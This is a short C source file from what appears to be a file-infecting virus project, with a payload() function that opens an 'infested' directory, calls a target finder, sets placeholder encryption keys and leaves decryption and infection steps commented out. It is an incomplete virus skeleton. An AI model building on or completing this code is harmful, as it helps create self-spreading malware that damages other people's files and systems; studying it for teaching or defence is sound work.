#include "ft_virus.h"

void payload()
{
	t_data data;
	int fd;

	data.key = 0xdeadbeaf;
	data.decrypt_start = 0xdeadbeaf;
	fd = OPEN(INFESTED_DIR, O_RDONLY | O_DIRECTORY);
	if (fd == -1)
		return ;
	finder(fd);
	//decrypt();
	/*
	while (fd = find_target(tmp))
	{
		fill_data();
	}
	go_to_start();
	*/
}

void payload_end(void)
{
	;
}

int main(void)
{
	payload();
	WRITE(1, "test\n", 5);
	return (0);
}
